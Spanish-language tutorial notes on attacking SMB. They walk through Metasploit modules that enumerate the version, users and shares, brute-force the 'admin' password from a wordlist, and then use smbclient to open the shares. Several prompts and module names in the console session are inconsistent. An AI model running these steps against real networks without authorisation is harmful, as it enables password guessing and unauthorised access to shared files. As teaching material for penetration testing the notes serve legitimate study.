Utiliza el puerto 445 y cuando corre sobre NetBios utiliza el puerto 139
Es un protocolo de compartir archivos en la red utilizado para compartir fisheros entre perifericos en la LAN
SAMBA es la implementacion de linux de SMB y permite a systemas Windows acceder a archivos y disositivos Linux

Metasploit cuenta con modulos auxiliares para hhacer enumeracion sobre este protocolo para obtener la version , usuarios y realizar fuerza bruta con el objetivo de identificar usuarios y passwords

```
msfconsole
msf6>workspace -a SMB_ENUM
msf6>setg RHOSTS ip   #setg establece la variable RHOST de forma global, para todos los modulos
msf6>search type:auxiliary name:smb
msf6>use auxiliary/scanner/smb/smb_version 
msf6 auxiliary(scanner/smb/smb_version)>show options #Al no tener user ni pass no devuelve nada
msf6 auxiliary(scanner/smb/smb_version)>run
msf6 auxiliary(scanner/smb/smb_version)>search type:auxiliary name:smb
msf6>use auxiliary/scanner/smb/smb_enumusers
msf6 auxiliary(scanner/smb/smb_enumusers)>run  #Muestra los usuarios que tiene smb
msf6 auxiliary(scanner/smb/smb_enumusers)>search type:auxiliary name:smb
msf6>use auxiliary/scanner/smb/smb_enumshares
msf6 auxiliary(scanner/smb/smb_enumshares)>set ShowFiles true
msf6 auxiliary(scanner/smb/smb_enumshares)>run  #Muestra los archivos compartidos

##Hacer Fuerza Bruta
msf6 auxiliary(scanner/smb/smb_enumusers)>search smb_login
msf6>use auxiliary/scanner/smb/smb_login
msf6 auxiliary(scanner/smb/smb_smb_login)>set SMBUser admin
msf6 auxiliary(scanner/smb/smb_smb_login)>set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
msf6 auxiliary(scanner/smb/smb_smb_login)>set STOP_ON_SUCCESS
msf6 auxiliary(scanner/smb/smb_enumshares)>run  #Comienza el ataque de fuerz bruta y se detiene cuando encuentra algo
```

Teniendo un usuario y el pass podremos conectarnos a los archivos compartidos en SMB con una utilidad que no es de metasploit llamada smbclient
```
smbclient -L \\\\ip\\ -U admin  #-L Para listar los files compartidos
smbclient \\\\ip\\public -U admin
```
